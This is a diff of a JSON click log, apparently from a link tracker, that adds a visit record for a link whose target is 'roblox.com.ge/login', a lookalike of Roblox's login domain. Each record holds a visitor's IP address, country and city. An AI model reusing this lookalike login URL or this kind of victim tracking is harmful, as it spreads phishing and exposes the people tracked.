@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1027,
+    "useCount": 1028,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8336,6 +8336,14 @@
         "city": "Salina Cruz",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777229738012,
+        "ip": "88.160.123.84",
+        "country": "France",
+        "city": "Paris",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
